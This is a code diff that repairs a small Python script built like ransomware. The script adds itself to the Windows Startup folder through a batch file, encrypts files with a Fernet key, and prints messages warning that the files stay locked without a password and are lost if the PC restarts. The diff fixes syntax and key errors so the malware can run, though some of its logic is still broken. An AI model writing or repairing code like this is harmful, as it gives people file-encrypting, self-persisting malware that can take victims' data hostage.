@@ -9,7 +9,7 @@ code = 0
 
 def autostart():
     # Path to Autostart
-    autostart_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    autostart_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
     
     # Name and Path of Shortcut
     shortcut_name = "m.bat"
@@ -20,7 +20,7 @@ def autostart():
         #adds the order to start the programm at PC start
         shortcut_file.write(f'start "" "{sys.executable}" "{os.path.abspath(__file__)}"')
 
-def encrypt()
+def encrypt():
     # Finds the files and adds them to a list
     for file in os.listdir():
 #      if file == "main.py" :
@@ -28,18 +28,18 @@ def encrypt()
         #this is for beeing safe and it only attaks the Test 
        if file !="Test.txt":
             continue
-      files.append(file)
+    files.append(file)
 
     #Generate a key for encrypting the files
-    key = fernet.generate_key()
+    key = Fernet.generate_key()
 
     #encrypt the files
-    for file in files
-    with open(file, "rb") as thefile:
-        contents = thefile.read()
-    contents_encrypted = Fernet(key).encrypt(contents)
-    with open(file, "wb") as thefile:
-        thefile.write(contents_encrypted)
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_encrypted)
 
     #Give an Output to the User
     print("Your Files have been encrypted, they will decrypt after typing in the Password")
@@ -47,7 +47,7 @@ def encrypt()
     print("When you change the stuff standing in your Files, is gone too so dont do that")
     print("And if you try to restart your Pc its not decryptabel too")
 
-def decrypt()
+def decrypt():
     #asks for the password
     code = input("Enter the password: ")
     #if rigth the files get decrypted
@@ -55,7 +55,7 @@ def decrypt()
         for file in files:
             with open(file, "rb") as thefile:
                 contents = thefile.read()
-            contents_decrypted = Fernet(secretkey).decrypt(contents)
+            contents_decrypted = Fernet(key).decrypt(contents)
             with open(file, "wb") as thefile:
                 thefile.write(contents_decrypted)
     #if not they dont
